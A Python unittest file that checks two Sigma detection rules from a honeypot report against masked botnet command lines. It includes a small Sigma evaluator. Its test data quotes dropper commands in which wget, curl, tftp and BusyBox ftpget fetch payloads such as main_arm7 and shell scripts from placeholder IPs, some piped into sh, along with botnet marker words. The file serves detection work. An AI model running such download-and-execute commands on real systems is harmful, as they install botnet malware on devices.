"""Tests for the two Sigma rules in README_REPORT.md's "Detection ideas", against real command lines.

Run from the repository root:

    python3 -m unittest discover -s analysis -p 'test_*.py'

The rules are read from the report itself, so the tests check what's published. The examples are
command lines bots sent to the honeypot, one per process as a process-creation log would show them,
masked: every IP is swapped for a documentation address (192.0.2.0/24, 198.51.100.0/24,
203.0.113.0/24), and each random BusyBox word for another of the same shape (upper case, lower case
and digits in the same places), so none can be matched to this honeypot. Nothing is run.

Sigma isn't installed here, so `sigma_matches` is a small evaluator for the parts these rules use:
the endswith, contains and re modifiers, lists, and and/or/not/"all of"/"1 of" conditions. Like
Sigma, endswith and contains ignore case and re doesn't.
"""

import fnmatch
import re
import unittest
from pathlib import Path

REPORT = Path(__file__).resolve().parent.parent / "README_REPORT.md"


def rule_text(title):
    """The YAML of the rule whose title starts with `title`."""
    blocks = re.findall(r"```yaml\n(.*?)```", REPORT.read_text(encoding="utf-8"), re.S)
    found = [b for b in blocks if re.search(rf"^title: {re.escape(title)}", b, re.M)]
    assert len(found) == 1, f"{len(found)} rules titled {title!r}"
    return found[0]


def scalar(text):
    text = text.strip()
    if len(text) >= 2 and text[0] == text[-1] == "'":
        return text[1:-1].replace("''", "'")
    assert not text.startswith('"'), "double-quoted YAML isn't supported here"
    return text


def detection_of(yaml_text):
    """The rule's detection block, parsed. Only the YAML these rules use is supported."""
    lines, inside = [], False
    for raw in yaml_text.splitlines():
        if raw.startswith("detection:"):
            inside = True
            continue
        if inside and raw and not raw.startswith(" "):
            break
        if inside and raw.strip() and not raw.strip().startswith("#"):
            lines.append([len(raw) - len(raw.lstrip()), raw.strip()])

    def block(i, indent):
        if lines[i][1].startswith("- "):
            items = []
            while i < len(lines) and lines[i][0] == indent and lines[i][1].startswith("- "):
                rest = lines[i][1][2:]
                if re.match(r"[\w|]+:", rest):  # a list item that's a mapping
                    lines[i] = [indent + 2, rest]
                    item, i = mapping(i, indent + 2)
                    items.append(item)
                else:
                    items.append(scalar(rest))
                    i += 1
            return items, i
        return mapping(i, indent)

    def mapping(i, indent):
        out = {}
        while i < len(lines) and lines[i][0] == indent and not lines[i][1].startswith("- "):
            key, _, rest = lines[i][1].partition(":")
            i += 1
            if rest.strip():
                out[key] = scalar(rest)
            else:
                assert lines[i][0] > indent, f"nothing under {key}"
                out[key], i = block(i, lines[i][0])
        return out, i

    detection, end = mapping(0, lines[0][0])
    assert end == len(lines), "part of the detection block wasn't read"
    return detection


def field_matches(event, spec, wanted):
    field, *modifiers = spec.split("|")
    assert set(modifiers) <= {"endswith", "contains", "re"}, f"unsupported modifier in {spec}"
    actual = event.get(field)
    if actual is None:
        return False

    def one(value):
        if "re" in modifiers:
            return re.search(value, actual) is not None
        a, v = actual.lower(), value.lower()
        if "contains" in modifiers:
            return v in a
        if "endswith" in modifiers:
            return a.endswith(v)
        return a == v

    return any(one(v) for v in (wanted if isinstance(wanted, list) else [wanted]))


def selection_matches(event, selection):
    if isinstance(selection, list):
        return any(selection_matches(event, s) for s in selection)
    return all(field_matches(event, spec, wanted) for spec, wanted in selection.items())


def sigma_matches(detection, event):
    results = {name: selection_matches(event, s) for name, s in detection.items() if name != "condition"}

    def quantified(m):
        hits = [hit for name, hit in results.items() if fnmatch.fnmatch(name, m[2])]
        assert hits, f"no selection matches {m[2]}"
        return str(all(hits) if m[1] == "all" else any(hits))

    condition = re.sub(r"\b(all|1) of (\S+)", quantified, detection["condition"])
    words = re.findall(r"\(|\)|\w+", condition)
    python = " ".join(w if w in ("(", ")", "and", "or", "not", "True", "False") else str(results[w])
                      for w in words)
    return eval(python, {"__builtins__": {}})  # only True, False, and, or, not and brackets


BUSYBOX = "/bin/busybox"


class BusyBoxWordRuleTests(unittest.TestCase):
    """Detection 1: BusyBox started with a made-up applet name."""

    def setUp(self):
        self.rule = detection_of(rule_text("BusyBox Started With"))

    def matches(self, command, image=BUSYBOX):
        return sigma_matches(self.rule, {"Image": image, "CommandLine": command})

    def test_botnet_names_from_nov_3_to_6_match(self):
        for word in ("SORA", "HISILICON", "V3G4", "KYTON", "YAKUZA", "UNSTABLE", "Cult", "BOTNET"):
            self.assertTrue(self.matches(f"/bin/busybox {word}"), word)

    def test_random_words_from_the_update_match_whatever_case_they_start_with(self):
        # Shaped like the three seen Nov 8–10. The last starts with a lower-case letter, which the
        # first version of the rule missed because it wanted an upper-case first letter.
        for word in ("ABcDe1Fg", "Abcd1EFg", "aBC1d2ef"):
            self.assertTrue(self.matches(f"/bin/busybox {word}"), word)

    def test_real_applets_do_not_match(self):
        for command in ("/bin/busybox wget -q -O x.sh http://192.0.2.10/x.sh", "/bin/busybox cat /proc/mounts",
                        "/bin/busybox hostname TENTOB", "/bin/busybox echo -e '\\x48\\x47\\x4a'",
                        "busybox dos2unix notes.txt", "busybox sha256sum firmware.bin", "/bin/busybox"):
            self.assertFalse(self.matches(command), command)

    def test_only_busybox_counts(self):
        self.assertFalse(self.matches("/usr/bin/foo SORA", image="/usr/bin/foo"))


class DownloadRuleTests(unittest.TestCase):
    """Detection 2: a download tool fetches a payload from a bare IP."""

    def setUp(self):
        self.rule = detection_of(rule_text("Download Tool Fetches"))

    def matches(self, image, command):
        return sigma_matches(self.rule, {"Image": image, "CommandLine": command})

    def test_the_nov_3_to_6_droppers_still_match(self):
        for image, command in [
            ("/usr/bin/wget", "wget -q -O main_arm7 http://192.0.2.10:8081/main_arm7"),
            ("/usr/bin/curl", "curl -s -O http://192.0.2.10:8081/main_arm7"),
            ("/usr/bin/tftp", "tftp -g -r main_arm7 192.0.2.10 69"),
            ("/usr/bin/wget", "wget --no-check-certificate -qO- https://198.51.100.7/sh"),
            ("/usr/bin/wget", "wget -O kla.sh http://203.0.113.5/bins/kla.sh"),
        ]:
            self.assertTrue(self.matches(image, command), command)

    def test_busybox_ftpget_from_a_bare_ip_matches(self):
        # The FTP fallbacks seen Nov 8–10, which the first version of the rule missed.
        for image, command in [
            (BUSYBOX, "busybox ftpget -v -u anonymous -p anonymous -P 21 198.51.100.7 all.sh all.sh"),
            (BUSYBOX, "/bin/busybox ftpget 203.0.113.5 ftpget.sh ftpget.sh"),
            ("/usr/bin/ftpget", "ftpget 203.0.113.5 ftpget.sh ftpget.sh"),
        ]:
            self.assertTrue(self.matches(image, command), command)

    def test_a_script_written_to_standard_output_matches_at_the_end_of_the_line(self):
        # Piped into sh by the shell, so the process's own command line ends with -O- or -o-.
        for image, command in [
            ("/usr/bin/wget", "wget http://203.0.113.5/wget.sh -O-"),
            ("/usr/bin/curl", "curl http://203.0.113.5/curl.sh -o-"),
            (BUSYBOX, "/bin/busybox wget http://203.0.113.5/wget.sh -O-"),
        ]:
            self.assertTrue(self.matches(image, command), command)

    def test_ordinary_downloads_do_not_match(self):
        for image, command in [
            ("/usr/bin/wget", "wget https://deb.debian.org/debian/pool/main/b/busybox/busybox.deb"),
            (BUSYBOX, "busybox ftpget ftp.example.org notes.txt notes.txt"),
            ("/usr/bin/wget", "wget -O report.pdf http://192.0.2.10/report.pdf"),
            ("/usr/bin/wget", "wget -O-output.log http://192.0.2.10/x"),
        ]:
            self.assertFalse(self.matches(image, command), command)


class EvaluatorTests(unittest.TestCase):
    """The small evaluator above, so a broken evaluator can't make the rule tests pass."""

    def test_a_selection_needs_every_field_and_a_list_needs_one_item(self):
        detection = {"sel": {"Image|endswith": ["/a", "/b"], "CommandLine|contains": "x"}, "condition": "sel"}
        self.assertTrue(sigma_matches(detection, {"Image": "/bin/B", "CommandLine": "aXa"}))
        self.assertFalse(sigma_matches(detection, {"Image": "/bin/c", "CommandLine": "x"}))
        self.assertFalse(sigma_matches(detection, {"Image": "/bin/a", "CommandLine": "y"}))

    def test_regexes_keep_case_and_conditions_combine(self):
        detection = {"s_a": {"CommandLine|re": "A"}, "s_b": [{"Image": "/x"}, {"Image": "/y"}],
                     "condition": "s_a and not s_b"}
        self.assertTrue(sigma_matches(detection, {"Image": "/z", "CommandLine": "A"}))
        self.assertFalse(sigma_matches(detection, {"Image": "/z", "CommandLine": "a"}))
        self.assertFalse(sigma_matches(detection, {"Image": "/y", "CommandLine": "A"}))
        detection["condition"] = "all of s_*"
        self.assertTrue(sigma_matches(detection, {"Image": "/y", "CommandLine": "A"}))

    def test_the_parser_reads_lists_of_mappings(self):
        parsed = detection_of("detection:\n  sel:\n    - A|re: 'x''y'\n    - B|contains:\n        - 'p'\n"
                              "        - 'q'\n  condition: sel\nlevel: low\n")
        self.assertEqual(parsed, {"sel": [{"A|re": "x'y"}, {"B|contains": ["p", "q"]}], "condition": "sel"})


if __name__ == "__main__":
    unittest.main()
